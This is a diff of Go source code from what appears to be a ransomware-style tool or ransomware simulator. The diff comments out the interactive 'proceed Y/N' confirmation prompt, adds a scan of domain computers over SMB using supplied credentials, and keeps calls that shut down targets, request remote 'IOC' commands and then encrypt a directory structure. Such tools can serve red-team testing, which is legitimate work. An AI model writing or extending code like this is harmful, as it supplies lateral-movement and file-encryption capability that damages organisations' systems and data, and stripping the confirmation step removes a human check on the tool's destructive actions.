@@ -54,12 +54,12 @@ __________________________________________________
 [*]
 [*] --<[ WARNING ]>--    --<[ WARNING ]>--    --<[ WARNING ]>--
 `, *arg_directory)
-		fmt.Printf("\n\r[*] DO YOU REALLY WANT TO PROCEED [Y|N]? ")
-		ans := []byte("N")
-		os.Stdin.Read(ans)
-		if ans[0] != 89 {
-			os.Exit(0)
-		}
+		//fmt.Printf("\n\r[*] DO YOU REALLY WANT TO PROCEED [Y|N]? ")
+		//ans := []byte("N")
+		//os.Stdin.Read(ans)
+		//if ans[0] != 89 {
+        //    os.Exit(0)
+		//}
 	}
 
     var config cjlib.YAML_CONFIG
@@ -75,31 +75,25 @@ __________________________________________________
         exclusions = config.Exclude
     }
 
+    // change default resolver if we need to
     if len(*arg_ns) > 0 {
         cjlib.SetDNSResolver(*arg_ns)
     }
 
-    // Fun IOC generation
-    //if len(*arg_ns) > 0 {
-    //    err = cjlib.Find_LDAP_Server(*arg_domain, *arg_ns)
-    //} else {
-    //    err = cjlib.Find_LDAP_Server(*arg_domain, "")
-    // }
-    if err != nil {
-        fmt.Println(err.Error())
-    }
-    computerName := cjlib.WindowsComputerName()
-    domain_status := cjlib.WindowsDomainStatus(computerName)
-    fmt.Printf("[*] Windows Computer Name: %s\n", computerName)
-    fmt.Printf("[*] Windows Domain Status: %s\n", domain_status)
-    panic(".")
+    cjlib.SMBScanDomainComputers(*arg_username, *arg_password, *arg_domain)
+    panic("... deliberate early termination ...")
+
+    //computerName := cjlib.WindowsComputerName()
+    //domain_status := cjlib.WindowsDomainStatus(computerName)
+    //fmt.Printf("[*] Windows Computer Name: %s\n", computerName)
+    //fmt.Printf("[*] Windows Domain Status: %s\n", domain_status)
 
     cjlib.Win32_GetLogicalDrives()
     cjlib.Win32_GetNativeSystemInfo()
     cjlib.Win32_RSMShutdownTargets()
     cjlib.Request_IOC_Commands(config)
     cjlib.Request_IOC_DNS(config)
-    cjlib.SMBScanSubnet(*arg_username, *arg_password, *arg_domain)
+    //cjlib.SMBScanSubnet(*arg_username, *arg_password, *arg_domain)
 
     // Encrypting directory structure
 	_, _, _, err = cjlib.EncryptDirectoryStructure(
